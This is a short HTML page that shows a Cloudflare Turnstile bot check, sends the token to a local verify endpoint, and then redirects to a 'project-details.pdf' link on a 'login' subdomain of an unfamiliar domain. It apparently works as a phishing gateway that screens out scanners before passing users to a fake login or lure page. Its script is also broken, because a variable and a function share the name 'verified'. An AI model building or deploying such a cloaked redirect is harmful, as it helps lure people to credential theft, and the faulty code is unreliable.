<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Redirecting</title>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</head>
<body>
  <div
    class="cf-turnstile"
    data-sitekey="0x4AAAAAAE_BMK-3H1GaeDw2"
    data-callback="verified">
  </div>

  <script>
    let verified = false;

    async function verified(token) {
      if (verified) return;
      verified = true;

      // Send the token to your server for verification.
      const response = await fetch("/api/verify", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ token })
      });

      if (!response.ok) {
        verified = false;
        return;
      }

      setTimeout(() => {
        window.location.assign("https://login.fudgekic.biz/view/project-details.pdf");
      }, 2000);
    }
  </script>
</body>
</html>
